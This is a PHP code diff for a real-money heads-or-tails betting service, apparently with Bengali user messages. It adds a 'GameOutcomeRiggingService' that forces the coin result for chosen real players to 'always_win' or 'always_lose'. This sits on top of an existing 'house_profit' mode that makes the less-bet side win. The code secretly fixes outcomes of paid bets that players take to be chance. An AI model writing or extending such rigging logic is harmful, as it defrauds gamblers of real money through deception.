@@ -130,6 +130,8 @@ class HeadsTailsService {
                 throw new Exception('ওয়ালেটে পর্যাপ্ত ব্যালেন্স নেই! দয়া করে ডিপোজিট করুন।');
             }
 
+            app(\App\Services\GameOutcomeRiggingService::class)->validatePlayerCanPlay($lockedUser, false);
+
             $opening = (float)$lockedUser->balance;
             $lockedUser->decrement('balance', $amount);
             $closing = (float)$lockedUser->fresh()->balance;
@@ -179,8 +181,27 @@ class HeadsTailsService {
 
             $winningSide = 'heads';
 
-            // House Profit Algorithm
-            if ($settings->control_mode === 'house_profit') {
+            // Check if any real player in this round has active rigging
+            $realBets = HeadsTailsBet::where('round_id', $round->id)->where('is_bot', false)->where('is_demo', false)->whereNotNull('user_id')->get();
+            $rigForcedSide = null;
+            $rigService = app(\App\Services\GameOutcomeRiggingService::class);
+            foreach ($realBets as $rBet) {
+                $rUser = User::find($rBet->user_id);
+                if ($rUser) {
+                    $mode = $rigService->getUserRigMode($rUser);
+                    if ($mode === 'always_win') {
+                        $rigForcedSide = $rBet->chosen_side;
+                        break;
+                    } elseif ($mode === 'always_lose') {
+                        $rigForcedSide = ($rBet->chosen_side === 'heads') ? 'tails' : 'heads';
+                        break;
+                    }
+                }
+            }
+
+            if ($rigForcedSide !== null) {
+                $winningSide = $rigForcedSide;
+            } elseif ($settings->control_mode === 'house_profit') {
                 if ($realHeads < $realTails) {
                     $winningSide = 'heads';
                 } elseif ($realTails < $realHeads) {
